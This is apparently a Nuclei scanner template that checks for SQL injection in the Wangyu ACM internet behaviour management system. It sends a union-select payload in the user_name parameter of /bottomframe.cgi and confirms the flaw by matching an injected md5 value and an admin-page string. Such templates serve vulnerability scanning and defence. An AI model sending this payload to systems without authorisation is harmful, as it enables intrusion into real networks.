id: poc-yaml-wangyu-acm-internet-management-system-sql-injection
info:
  name: 网御-ACM上网行为管理系统-SQL注入
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  v1: "{{rand_int(0, 100)}}"

http:
  - raw:
      - |
        GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5({{v1}})%23 HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "当前管理员"
          - "{{md5(v1)}}"
        part: body
